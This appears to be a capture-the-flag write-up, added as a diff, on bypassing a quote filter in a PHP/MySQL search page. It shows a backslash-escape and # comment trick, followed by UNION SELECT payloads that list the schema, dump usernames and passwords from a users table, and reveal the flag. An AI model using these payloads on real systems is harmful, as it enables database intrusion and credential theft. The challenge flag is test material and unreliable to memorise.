@@ -1,0 +1,56 @@
+We continue with the bad input sanitization saga
+Here we have now single and double quotes filtered out
+
+It seems that now also the default %% that were there for filtering the selection
+aren't present, meaning that in order to select everything as was the default behavior
+A % will suffice
+
+After looking up and trying terminating the quotes in different ways I reached the conclusion
+that maybe looking into escaping the end-quote and understanding what we can do with It
+
+I also tried just using ; and executing a query after, then commenting out the rest but it didn't really work
+
+Simply escaping with \ will result in: 
+    SELECT * FROM search_engine WHERE title LIKE '\' OR description LIKE '
+    \'OR link LIKE '\';
+
+The first part is a valid query! but the second is a syntax error..
+
+Maybe then using a null-byte in an attempt to terminate the string then commenting out the rest
+Neither do
+?q=%00; SELECT * FROM search_engine --%20
+nor
+?q=%00 UNION SELECT * FROM search_engine #
+work
+
+Indeed after some reading I saw that adding ; won't work as mysqli->query of PHP won't execute
+multiple queries unless explicitly specified to
+
+    SELECT * FROM search_engine WHERE title LIKE '*/
+        /**//*' OR description LIKE '
+            *//**//*'OR link LIKE '*//**//*';
+
+Back to trying out the \ as it seems the most promising, it seems that we have the following
+restictions:
+    must end in \
+    must not include the last ' as it introduces a syntax error
+
+Maybe # Would do the trick, this should produce
+SELECT * FROM search_engine WHERE title LIKE '#\' OR description LIKE '
+    #\'OR link LIKE '\';
+
+Here all the query should be valid!
+Let's try our union injection
+
+UNION SELECT * FROM search_engine #\
+
+Returns all the results!
+Let's do the drill again
+Checking Rows:
+UNION SELECT column_name AS title, table_name AS link, DATA_TYPE as description FROM information_schema.columns; #\
+UNION SELECT username AS title, username AS link, password AS description FROM users; #\
+
+Administrator
+FLAG-d4mn_Y0ur3_G3tt1ng_G00d_4t_Th15
+
+:) Thanks
